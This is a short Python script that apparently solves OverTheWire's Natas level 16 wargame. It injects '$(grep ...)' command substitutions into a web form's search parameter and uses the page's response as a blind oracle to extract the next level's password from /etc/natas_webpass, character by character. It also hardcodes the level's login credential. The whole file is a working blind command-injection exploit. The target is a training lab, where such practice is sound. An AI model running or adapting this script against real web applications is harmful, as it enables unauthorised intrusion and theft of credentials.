import requests

lets = "abcdefghijklmnopqrstuvwxzyABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
p_lets = ""
for i in lets:
    dat = {"needle":f"razor$(grep {i} /etc/natas_webpass/natas17)"}
    x = requests.post("http://natas16.natas.labs.overthewire.org/", dat, auth=("natas16","TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"))

    if "razor" not in x.text:
        p_lets += i 
        print(p_lets)

passw=""
while True:
    passw_n = passw 
    for i in p_lets:
        passw_t = passw + i
        dat = {"needle":f"razor$(grep ^{passw_t} /etc/natas_webpass/natas17)"}
        x = requests.post("http://natas16.natas.labs.overthewire.org/", dat, auth=("natas16","TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"))
        if "razor" not in x.text:
            passw += i 
            print(passw)
            break
    if passw == passw_n: 
        break 